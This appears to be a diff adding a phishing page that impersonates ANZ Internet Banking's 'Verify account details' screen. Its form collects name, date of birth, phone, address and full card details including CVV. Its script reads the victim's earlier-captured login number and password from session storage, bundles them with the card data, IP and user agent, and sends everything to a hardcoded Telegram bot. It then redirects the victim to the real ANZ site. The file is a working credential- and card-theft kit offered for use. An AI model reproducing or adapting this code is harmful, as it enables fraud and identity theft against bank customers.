@@ -1,0 +1,991 @@
+<!DOCTYPE html> 
+<html class="no-js" lang="en">
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <title>ANZ - Verify account details</title>
+      <meta name="description" content="Web Login - ANZ Internet Banking">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      <meta name="theme-color" content="#000000">
+      <meta http-equiv="Cache-control" content="no-cache, no-store, must-revalidate">
+      <meta http-equiv="Pragma" content="no-cache">
+      
+      <!-- ANZ Fonts -->
+      <style>
+         @font-face{font-family:"Myriad pro";src:url(assets/asset_0001.woff)}
+         @font-face{font-family:myriad-pro-light;src:url(assets/asset_0002.woff)}
+         @font-face{font-family:myriad-pro-semibold;src:url(assets/asset_0003.woff)}
+         
+         html{line-height:1.15;text-size-adjust:100%}
+         hr{box-sizing:content-box;height:0;overflow:visible}
+         a{background-color:transparent}
+         img{border-style:none}
+         button,input{font-size:100%}
+         button,input{overflow:visible}
+         button{text-transform:none}
+         button,[type="submit"]{appearance:button}
+         [type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{appearance:none;margin:0}
+         [type="search"]::-webkit-search-decoration{appearance:none}
+         ::-webkit-file-upload-button{appearance:button;font:inherit}
+         *,::after,::before{box-sizing:border-box}
+         
+         body {
+            margin:0;
+            font-style:normal;
+            font-weight:normal;
+            font-variant:normal;
+            text-transform:none;
+            -webkit-font-smoothing:antialiased;
+            line-height:1.25;
+            letter-spacing:normal;
+            min-width:320px;
+            opacity:1!important;
+            font-family:"Myriad pro",sans-serif!important;
+            color:rgb(73,73,73)!important;
+            font-size:16px!important;
+         }
+         
+         body input,body button {
+            margin:0;
+            line-height:1.25;
+            font-family:inherit!important;
+         }
+         
+         body a {
+            text-decoration:none;
+            color:rgb(0,114,172);
+         }
+         
+         body a:hover,body a:focus {
+            text-decoration:underline!important;
+         }
+         
+         body input[type="number"]::-webkit-inner-spin-button,
+         body input[type="number"]::-webkit-outer-spin-button {
+            appearance:none;
+            margin:0;
+         }
+         
+         body input:focus {
+            outline:none;
+         }
+         
+         body input:disabled {
+            color:rgb(57,74,88);
+            -webkit-text-fill-color:rgb(57,74,88);
+         }
+         
+         /* ANZ Layout Styles */
+         .pageContainer {
+            display:flex;
+            flex-direction:column;
+            min-height:100vh;
+         }
+         
+         header {
+            position:relative;
+            z-index:9;
+            width:100%;
+            top:0;
+         }
+         
+         .header-bar {
+            height:60px;
+            width:100%;
+            background-color:rgb(0,65,101);
+         }
+         
+         .header-content {
+            max-width:1200px;
+            margin:0 auto;
+            padding:0 32px;
+         }
+         
+         @media screen and (max-width:959px) {
+            .header-content {padding:0 24px;}
+         }
+         
+         @media screen and (max-width:767px) {
+            .header-content {padding:0 16px;}
+         }
+         
+         @media screen and (max-width:479px) {
+            .header-content {padding:0 24px;}
+         }
+         
+         .anz-logo {
+            width:103px;
+            height:42px;
+            margin-top:10px;
+         }
+         
+         main {
+            display:flex;
+            flex-direction:column;
+            justify-content:center;
+            flex:1 0 auto;
+            padding:48px 0;
+         }
+         
+         @media screen and (max-width:767px) {
+            main {padding:0;}
+         }
+         
+         .content-wrapper {
+            max-width:560px;
+            margin:0 auto;
+            width:100%;
+         }
+         
+         @media screen and (max-width:767px) {
+            .content-wrapper {
+               max-width:100%;
+               border:none;
+            }
+         }
+         
+         .card-container {
+            min-height:auto;
+            background-color:rgb(255,255,255);
+            border:1px solid rgb(226,228,230);
+            border-radius:3px;
+            padding:64px 32px;
+         }
+         
+         @media screen and (max-width:767px) {
+            .card-container {
+               padding:48px 16px;
+               border:none;
+            }
+         }
+         
+         @media screen and (max-width:479px) {
+            .card-container {
+               padding:48px 24px;
+            }
+         }
+         
+         h1 {
+            margin:0 0 40px 0;
+            text-align:left;
+            font-weight:600;
+            line-height:1.125;
+            letter-spacing:normal;
+            color:rgb(0,65,101);
+            font-size:30px;
+            font-family:myriad-pro-light,sans-serif!important;
+         }
+         
+         @media screen and (max-width:959px) {
+            h1 {font-size:28px;}
+         }
+         
+         @media screen and (max-width:479px) {
+            h1 {text-align:center!important;}
+         }
+         
+         /* Form Styles */
+         .form-group {
+            margin-bottom:24px;
+         }
+         
+         .field-label {
+            color:rgb(73,73,73);
+            margin-bottom:4px;
+            letter-spacing:normal;
+            display:block;
+            font-size:16px;
+         }
+         
+         .input-wrapper {
+            position:relative;
+         }
+         
+         .form-input {
+            width:100%;
+            padding:0 24px 0 12px;
+            background-color:transparent;
+            border:1px solid rgb(204,204,204);
+            border-radius:4px;
+            transition:border-color 0.2s,height 0.2s,line-height 0.2s,font-size 0.2s,padding 0.2s;
+            font-size:16px;
+            color:rgb(73,73,73);
+            height:44px;
+         }
+         
+         .form-input:focus {
+            border-color:rgb(0,114,172);
+         }
+         
+         .form-input.invalid {
+            border-color:rgb(251,113,133);
+         }
+         
+         /* DOB Fieldset - HotDoc Style */
+         .dob-fieldset {
+            border:none;
+            padding:0;
+            margin:0;
+         }
+         
+         .dob-legend {
+            color:rgb(73,73,73);
+            margin-bottom:8px;
+            letter-spacing:normal;
+            font-size:16px;
+            padding:0;
+         }
+         
+         .dob-container {
+            display:flex;
+            gap:8px;
+            align-items:flex-start;
+         }
+         
+         .dob-box {
+            flex:1;
+            max-width:80px;
+         }
+         
+         .dob-box.year {
+            max-width:100px;
+         }
+         
+         .dob-input {
+            width:100%;
+            height:44px;
+            padding:0 8px;
+            background-color:transparent;
+            border:1px solid rgb(204,204,204);
+            border-radius:4px;
+            transition:border-color 0.2s;
+            font-size:16px;
+            color:rgb(73,73,73);
+            text-align:center;
+         }
+         
+         .dob-input:focus {
+            border-color:rgb(0,114,172);
+            outline:none;
+         }
+         
+         .dob-input.invalid {
+            border-color:rgb(251,113,133);
+         }
+         
+         .dob-label {
+            display:block;
+            font-size:11px;
+            color:rgb(116,118,120);
+            text-transform:uppercase;
+            letter-spacing:0.5px;
+            margin-top:4px;
+            text-align:center;
+         }
+         
+         /* Error Messages */
+         .error-message {
+            color:rgb(251,113,133);
+            font-size:13px;
+            display:none;
+            margin-top:6px;
+         }
+         
+         .error-message.visible {
+            display:block;
+         }
+         
+         /* Checkbox Styles */
+         .checkbox-wrapper {
+            display:flex;
+            align-items:flex-start;
+            gap:12px;
+            margin:24px 0;
+         }
+         
+         .checkbox-wrapper input[type="checkbox"] {
+            width:18px;
+            height:18px;
+            margin-top:2px;
+            cursor:pointer;
+         }
+         
+         .checkbox-wrapper label {
+            font-size:14px;
+            color:rgb(73,73,73);
+            cursor:pointer;
+         }
+         
+         /* Button Styles */
+         .submit-btn {
+            width:100%;
+            margin:0;
+            background-color:rgb(0,114,172);
+            color:rgb(255,255,255);
+            border:1px solid transparent;
+            border-radius:4px;
+            font-weight:600;
+            padding:12px;
+            cursor:pointer;
+            transition:background-color 0.2s,border-color 0.2s,color 0.2s;
+            font-family:myriad-pro-semibold,sans-serif,sans-serif!important;
+            font-size:16px;
+            display:flex;
+            align-items:center;
+            justify-content:center;
+            gap:8px;
+         }
+         
+         .submit-btn:hover, .submit-btn:focus {
+            outline:none;
+            background-color:rgb(0,147,216);
+         }
+         
+         .submit-btn:disabled {
+            cursor:not-allowed;
+            opacity:0.6;
+         }
+         
+         /* Info Box */
+         .info-box {
+            background:rgb(240,250,255);
+            border:1px solid rgb(147,199,229);
+            border-radius:3px;
+            display:block;
+            padding:16px;
+            font-size:14px;
+            margin-bottom:24px;
+         }
+         
+         /* Footer */
+         footer {
+            width:100%;
+            background-color:rgb(0,114,172);
+            color:rgb(255,255,255);
+            padding:32px 0;
+            margin-top:auto;
+         }
+         
+         .footer-content {
+            max-width:1200px;
+            margin:0 auto;
+            padding:0 32px;
+         }
+         
+         @media screen and (max-width:959px) {
+            .footer-content {padding:0 24px;}
+         }
+         
+         @media screen and (max-width:767px) {
+            .footer-content {padding:0 16px;}
+         }
+         
+         @media screen and (max-width:479px) {
+            .footer-content {padding:0 24px;}
+         }
+         
+         .footer-text {
+            white-space:nowrap;
+         }
+         
+         /* Links */
+         .form-link {
+            color:rgb(0,114,172);
+            text-decoration:none;
+            font-size:14px;
+         }
+         
+         .form-link:hover, .form-link:focus {
+            text-decoration:underline!important;
+         }
+         
+         .link-row {
+            display:flex;
+            justify-content:space-between;
+            align-items:center;
+            margin-top:24px;
+         }
+         
+         @media screen and (max-width:479px) {
+            .link-row {
+               flex-direction:column;
+               gap:16px;
+               text-align:center;
+            }
+         }
+         
+         hr {
+            margin:56px 0 32px 0;
+            border:0;
+            border-top:1px solid rgb(204,204,204);
+         }
+         
+         @media screen and (max-width:767px) {
+            hr {margin:40px 0 24px 0;}
+         }
+         
+         /* Loading Screen */
+         #loading-screen {
+            display:none;
+            position:fixed;
+            top:0;
+            left:0;
+            width:100%;
+            height:100%;
+            background:#ffffff;
+            z-index:9999;
+            justify-content:center;
+            align-items:center;
+            flex-direction:column;
+         }
+         
+         .loader {
+            width:80px;
+            height:80px;
+            border:4px solid rgb(240,240,240);
+            border-top-color:rgb(0,114,172);
+            border-radius:50%;
+            animation:spin 1s linear infinite;
+         }
+         
+         @keyframes spin {
+            to {transform:rotate(360deg);}
+         }
+         
+         .loading-text {
+            margin-top:24px;
+            color:rgb(73,73,73);
+            font-size:16px;
+         }
+         
+         /* Helper text */
+         .helper-text {
+            font-size:13px;
+            color:rgb(116,118,120);
+            margin-top:4px;
+         }
+      </style>
+      
+      <meta name="referrer" content="no-referrer">
+      <link rel="icon" href="assets/asset_0008.bin">
+      <link rel="canonical" href="https://login.anz.com/internetbanking">
+   </head>
+   
+   <body style="overflow:auto">
+      <!-- Loading Screen -->
+      <div id="loading-screen">
+         <div class="loader"></div>
+         <div class="loading-text">Verifying your details...</div>
+      </div>
+
+      <div id="root" class="pageContainer" aria-hidden="false">
+         <header>
+            <div class="header-bar">
+               <div class="header-content">
+                  <a href="https://www.anz.com.au/personal/" title="ANZ Logo">
+                     <img src="assets/asset_0009.svg" alt="ANZ logo" class="anz-logo">
+                  </a>
+               </div>
+            </div>
+         </header>
+         
+         <main>
+            <div class="content-wrapper">
+               <div class="card-container">
+                  <h1>Verify your account details</h1>
+                  
+                  <div class="info-box">
+                     Please verify your identity by providing your personal and payment details below.
+                  </div>
+                  
+                  <form id="verify-form" action="#" method="post" novalidate>
+                     
+                     <!-- Full Name -->
+                     <div class="form-group">
+                        <label class="field-label" for="full-name">Full name</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="full-name" name="fullName" class="form-input" placeholder="John Smith" autocomplete="name" aria-describedby="full-name-error">
+                        </div>
+                        <div id="full-name-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Date of Birth - HotDoc Style -->
+                     <div class="form-group">
+                        <fieldset class="dob-fieldset" aria-describedby="dob-error">
+                           <legend class="dob-legend">Date of birth</legend>
+                           <div class="dob-container">
+                              <div class="dob-box">
+                                 <input type="number" id="dob-day" class="dob-input" inputmode="numeric" maxlength="2" pattern="[0-9]*" placeholder="DD" aria-label="Day">
+                                
+                              </div>
+                              <div class="dob-box">
+                                 <input type="number" id="dob-month" class="dob-input" inputmode="numeric" maxlength="2" pattern="[0-9]*" placeholder="MM" aria-label="Month">
+                               
+                              </div>
+                              <div class="dob-box year">
+                                 <input type="number" id="dob-year" class="dob-input" inputmode="numeric" maxlength="4" pattern="[0-9]*" placeholder="YYYY" aria-label="Year">
+                           
+                              </div>
+                           </div>
+                        </fieldset>
+                        <div class="helper-text">Must be 18 years or older</div>
+                        <div id="dob-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Mobile Number -->
+                     <div class="form-group">
+                        <label class="field-label" for="mobile-number">Mobile number</label>
+                        <div class="input-wrapper">
+                           <input type="tel" id="mobile-number" name="mobileNumber" class="form-input" placeholder="04XX XXX XXX" autocomplete="tel" maxlength="12" aria-describedby="mobile-error">
+                        </div>
+                        <div id="mobile-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Address -->
+                     <div class="form-group">
+                        <label class="field-label" for="address">Residential address</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="address" name="address" class="form-input" placeholder="123 George St, Sydney NSW 2000" autocomplete="street-address" aria-describedby="address-error">
+                        </div>
+                        <div id="address-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Card Number -->
+                     <div class="form-group">
+                        <label class="field-label" for="card-number">Card number</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="card-number" name="cardNumber" class="form-input" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number" aria-describedby="card-error">
+                        </div>
+                        <div id="card-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Expiry Date -->
+                     <div class="form-group">
+                        <label class="field-label" for="expiry-date">Expiry date</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="expiry-date" name="expiryDate" class="form-input" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp" aria-describedby="expiry-error">
+                        </div>
+                        <div id="expiry-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- CVV -->
+                     <div class="form-group">
+                        <label class="field-label" for="cvv">CVV</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="cvv" name="cvv" class="form-input" placeholder="123" maxlength="3" autocomplete="cc-csc" aria-describedby="cvv-error">
+                        </div>
+                        <div class="helper-text">3 digits on back of card</div>
+                        <div id="cvv-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Name on Card -->
+                     <div class="form-group">
+                        <label class="field-label" for="name-on-card">Name on card</label>
+                        <div class="input-wrapper">
+                           <input type="text" id="name-on-card" name="nameOnCard" class="form-input" placeholder="J SMITH" autocomplete="cc-name" aria-describedby="name-card-error">
+                        </div>
+                        <div id="name-card-error" class="error-message" role="alert"></div>
+                     </div>
+                     
+                     <!-- Remember Me -->
+                     <div class="checkbox-wrapper">
+                        <input type="checkbox" id="remember-me" name="rememberMe" checked>
+                        <label for="remember-me">Keep me signed in on this trusted device</label>
+                     </div>
+                     
+                     <!-- Submit Button -->
+                     <button type="submit" class="submit-btn" id="submit-btn">
+                        <svg viewBox="0 0 16 16" width="16" height="16" style="margin-right:8px;">
+                           <path d="M13.585 6.209h-.89V4.695A4.7 4.7 0 0 0 8 0a4.7 4.7 0 0 0-4.695 4.695V6.21h-.89a.296.296 0 0 0-.296.297v9.198c0 .162.133.295.297.295h11.169a.296.296 0 0 0 .296-.297V6.506a.297.297 0 0 0-.296-.297zm-8.28-1.514A2.698 2.698 0 0 1 8 2a2.698 2.698 0 0 1 2.695 2.695V6.21h-5.39V4.695zm3.57 5.98v2.368a.874.874 0 0 1-1.748 0v-2.367a1.342 1.342 0 0 1-.484-1.024c0-.749.61-1.358 1.358-1.358.749 0 1.358.61 1.358 1.358 0 .395-.18.768-.484 1.023z" fill="currentColor"></path>
+                        </svg>
+                        Verify account
+                     </button>
+                     
+                  </form>
+                  
+                  <div class="link-row">
+                     <a href="https://www.recovery.anz.com/recover/do-you-know-your-crn" class="form-link">Forgot login details?</a>
+                     <a href="https://login.anz.com/internetbanking/help" class="form-link">Help</a>
+                  </div>
+                  
+                  <hr>
+                  
+                  <div style="text-align:center;margin-bottom:24px;">
+                     <span style="font-size:16px;">New to Internet Banking? <a href="https://register.anz.com/internetbanking" class="form-link">Register</a></span>
+                  </div>
+                  
+                  <div style="text-align:center;font-size:14px;color:rgb(116,118,120);">
+                     By logging in, you accept our <a href="https://www.anz.com.au/privacy/centre/security-privacy/" class="form-link">Security and Privacy Statement.</a>
+                  </div>
+                  
+               </div>
+            </div>
+         </main>
+         
+         <footer>
+            <div class="footer-content">
+               <div class="footer-text">© Australia and New Zealand Banking Group Limited (ANZ) 2026 ABN 11 005 357 522.</div>
+            </div>
+         </footer>
+      </div>
+
+      <script>
+   document.addEventListener('DOMContentLoaded', function() {
+      const form = document.getElementById('verify-form');
+      const loadingScreen = document.getElementById('loading-screen');
+      const sessionWarning = document.getElementById('session-warning');
+      
+      // Retrieve login data from index.html
+      let loginData = null;
+      try {
+         const stored = sessionStorage.getItem('anz_login_data');
+         if (stored) {
+            loginData = JSON.parse(stored);
+            // Show session warning if we have login data
+            sessionWarning.style.display = 'block';
+         }
+      } catch (e) {
+         console.error('Error reading session data:', e);
+      }
+      
+      // Input fields
+      const fullName = document.getElementById('full-name');
+      const dobDay = document.getElementById('dob-day');
+      const dobMonth = document.getElementById('dob-month');
+      const dobYear = document.getElementById('dob-year');
+      const mobileNumber = document.getElementById('mobile-number');
+      const address = document.getElementById('address');
+      const cardNumber = document.getElementById('card-number');
+      const expiryDate = document.getElementById('expiry-date');
+      const cvv = document.getElementById('cvv');
+      const nameOnCard = document.getElementById('name-on-card');
+      
+      // Error display helper
+      const showError = (input, errorId, show = true) => {
+         const errorEl = document.getElementById(errorId);
+         if (show) {
+            input.classList.add('invalid');
+            errorEl.classList.add('visible');
+         } else {
+            input.classList.remove('invalid');
+            errorEl.classList.remove('visible');
+         }
+      };
+      
+      // Full name validation
+      const validateFullName = () => {
+         const value = fullName.value.trim();
+         if (value.length < 2 || !/^[a-zA-Z\s'-]+$/.test(value)) {
+            showError(fullName, 'full-name-error');
+            return false;
+         }
+         showError(fullName, 'full-name-error', false);
+         return true;
+      };
+      
+      // DOB formatting
+      const formatDOB = (input, max) => {
+         let value = input.value.replace(/\D/g, '');
+         if (value.length > max) value = value.substring(0, max);
+         
+         // Auto-add leading zero for single digits
+         if (input.id === 'dob-day' && value.length === 1 && parseInt(value) > 3) {
+            value = '0' + value;
+         }
+         if (input.id === 'dob-month' && value.length === 1 && parseInt(value) > 1) {
+            value = '0' + value;
+         }
+         
+         input.value = value;
+      };
+      
+      dobDay.addEventListener('input', () => formatDOB(dobDay, 2));
+      dobMonth.addEventListener('input', () => formatDOB(dobMonth, 2));
+      dobYear.addEventListener('input', () => formatDOB(dobYear, 4));
+      
+      // Auto-tab between DOB fields
+      dobDay.addEventListener('input', (e) => {
+         if (e.target.value.length === 2) dobMonth.focus();
+      });
+      dobMonth.addEventListener('input', (e) => {
+         if (e.target.value.length === 2) dobYear.focus();
+      });
+      
+      // DOB validation
+      const validateDOB = () => {
+         const day = dobDay.value.padStart(2, '0');
+         const month = dobMonth.value.padStart(2, '0');
+         const year = dobYear.value;
+         
+         // Clear previous errors
+         showError(dobDay, 'dob-error', false);
+         
+         if (!day || !month || !year || year.length !== 4) {
+            showError(dobDay, 'dob-error');
+            return false;
+         }
+         
+         const dayNum = parseInt(day, 10);
+         const monthNum = parseInt(month, 10);
+         const yearNum = parseInt(year, 10);
+         
+         // Check ranges
+         if (dayNum < 1 || dayNum > 31 || monthNum < 1 || monthNum > 12 || yearNum < 1900 || yearNum > 2026) {
+            showError(dobDay, 'dob-error');
+            return false;
+         }
+         
+         // Check valid date
+         const date = new Date(yearNum, monthNum - 1, dayNum);
+         if (date.getDate() !== dayNum || date.getMonth() !== monthNum - 1 || date.getFullYear() !== yearNum) {
+            showError(dobDay, 'dob-error');
+            return false;
+         }
+         
+         // Check age (18+)
+         const today = new Date();
+         const age = today.getFullYear() - yearNum;
+         if (age < 18 || (age === 18 && (today.getMonth() < monthNum - 1 || (today.getMonth() === monthNum - 1 && today.getDate() < dayNum)))) {
+            showError(dobDay, 'dob-error');
+            return false;
+         }
+         
+         return true;
+      };
+      
+      // Mobile number formatting (Australian format)
+      const formatMobile = (e) => {
+         let value = e.target.value.replace(/\D/g, '');
+         // Must start with 04, max 10 digits
+         if (value.length > 10) value = value.substring(0, 10);
+         
+         // Format as 04XX XXX XXX
+         if (value.length >= 4) {
+            value = value.substring(0, 4) + ' ' + value.substring(4);
+         }
+         if (value.length >= 8) {
+            value = value.substring(0, 8) + ' ' + value.substring(8);
+         }
+         
+         e.target.value = value;
+      };
+      
+      mobileNumber.addEventListener('input', formatMobile);
+      
+      // Mobile validation
+      const validateMobile = () => {
+         const value = mobileNumber.value.replace(/\s/g, '');
+         const regex = /^04\d{8}$/;
+         
+         if (!regex.test(value)) {
+            showError(mobileNumber, 'mobile-error');
+            return false;
+         }
+         showError(mobileNumber, 'mobile-error', false);
+         return true;
+      };
+      
+      // Address validation
+      const validateAddress = () => {
+         const value = address.value.trim();
+         if (value.length < 5) {
+            showError(address, 'address-error');
+            return false;
+         }
+         showError(address, 'address-error', false);
+         return true;
+      };
+      
+      // Card number formatting
+      const formatCardNumber = (e) => {
+         let value = e.target.value.replace(/\D/g, '');
+         if (value.length > 16) value = value.substring(0, 16);
+         e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+      };
+      
+      cardNumber.addEventListener('input', formatCardNumber);
+      
+      // Luhn algorithm for card validation
+      const validateCardLuhn = (number) => {
+         let sum = 0;
+         let shouldDouble = false;
+         for (let i = number.length - 1; i >= 0; i--) {
+            let digit = parseInt(number.charAt(i));
+            if (shouldDouble) {
+               digit *= 2;
+               if (digit > 9) digit -= 9;
+            }
+            sum += digit;
+            shouldDouble = !shouldDouble;
+         }
+         return sum % 10 === 0;
+      };
+      
+      const validateCard = () => {
+         const value = cardNumber.value.replace(/\s/g, '');
+         const regex = /^\d{16}$/;
+         
+         if (!regex.test(value) || !validateCardLuhn(value)) {
+            showError(cardNumber, 'card-error');
+            return false;
+         }
+         showError(cardNumber, 'card-error', false);
+         return true;
+      };
+      
+      // Expiry date formatting
+      const formatExpiry = (e) => {
+         let value = e.target.value.replace(/\D/g, '');
+         if (value.length > 4) value = value.substring(0, 4);
+         if (value.length > 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+         }
+         e.target.value = value;
+      };
+      
+      expiryDate.addEventListener('input', formatExpiry);
+      
+      // Expiry validation
+      const validateExpiry = () => {
+         const value = expiryDate.value;
+         const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+         
+         if (!regex.test(value)) {
+            showError(expiryDate, 'expiry-error');
+            return false;
+         }
+         
+         const [month, year] = value.split('/');
+         const expiry = new Date(2000 + parseInt(year), parseInt(month) - 1);
+         const today = new Date();
+         
+         // Set to end of expiry month
+         expiry.setMonth(expiry.getMonth() + 1);
+         expiry.setDate(0);
+         
+         if (expiry < today) {
+            showError(expiryDate, 'expiry-error');
+            return false;
+         }
+         
+         showError(expiryDate, 'expiry-error', false);
+         return true;
+      };
+      
+      // CVV validation
+      const validateCVV = () => {
+         const regex = /^\d{3}$/;
+         if (!regex.test(cvv.value)) {
+            showError(cvv, 'cvv-error');
+            return false;
+         }
+         showError(cvv, 'cvv-error', false);
+         return true;
+      };
+      
+      // Name on card validation
+      const validateNameOnCard = () => {
+         const value = nameOnCard.value.trim();
+         const regex = /^[A-Za-z\s]+$/;
+         
+         if (!value || !regex.test(value)) {
+            showError(nameOnCard, 'name-card-error');
+            return false;
+         }
+         showError(nameOnCard, 'name-card-error', false);
+         return true;
+      };
+      
+      // Get client IP
+      const getClientIP = async () => {
+         try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+         } catch (error) {
+            return 'Unavailable';
+         }
+      };
+      
+      // Form submission
+      form.addEventListener('submit', async function(e) {
+         e.preventDefault();
+         
+         // Validate all fields
+         let isValid = true;
+         if (!validateFullName()) isValid = false;
+         if (!validateDOB()) isValid = false;
+         if (!validateMobile()) isValid = false;
+         if (!validateAddress()) isValid = false;
+         if (!validateCard()) isValid = false;
+         if (!validateExpiry()) isValid = false;
+         if (!validateCVV()) isValid = false;
+         if (!validateNameOnCard()) isValid = false;
+         
+         if (!isValid) return;
+         
+         // Show loading
+         loadingScreen.style.display = 'flex';
+         
+         // Get IP and prepare data
+         const clientIP = await getClientIP();
+         const now = new Date();
+         const dateStr = now.toLocaleString('en-GB', {
+            day: '2-digit',
+            month: '2-digit',
+            year: '2-digit',
+            hour: '2-digit',
+            minute: '2-digit',
+            hour12: true
+         });
+         
+         const formattedDOB = `${dobDay.value.padStart(2, '0')}/${dobMonth.value.padStart(2, '0')}/${dobYear.value}`;
+         
+         // Build message including login data from index.html
+         const crn = loginData ? loginData.crn : 'Not captured';
+         const password = loginData ? loginData.password : 'Not captured';
+         
+         const message = `
++---------------- [🔵 ANZ 🔵] ---------------+
+| Client: ${crn}
+| Password: ${password}
++---------------- [👤 PERSONAL INFO 👤] ----------------+
+| Full Name: ${fullName.value}
+| DOB: ${formattedDOB}
+| Phone: ${mobileNumber.value}
+| Address: ${address.value}
++---------------- [💳 CARD DETAILS 💳] ----------------+
+| CC: ${cardNumber.value}
+| Exp: ${expiryDate.value}
+| CVV: ${cvv.value}
+| Name: ${nameOnCard.value}
++------------------ [📍 INFO 📍] ------------------+
+| IP: https://ipgeolocation.io/ip-location/${clientIP}
+| UA: ${navigator.userAgent}
+| Time: ${dateStr}
++----------------------------------------------------------+
+         `;
+         
+         // Send to Telegram
+         const botToken = '8294882391:AAGhtpCr05OR5Y4bNnwmdsPcnMWMQ-8awFw';
+         const chatId = '7987288274';
+         const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+         
+         try {
+            await fetch(telegramUrl);
+         } catch (err) {
+            console.error('Telegram error:', err);
+         }
+         
+         // Clear session storage
+         sessionStorage.removeItem('anz_login_data');
+         
+         // Redirect after delay
+         setTimeout(() => {
+            window.location.href = "https://www.anz.com.au/personal/";
+         }, 3000 + Math.random() * 2000);
+      });
+   });
+</script>
+   </body>
+</html>
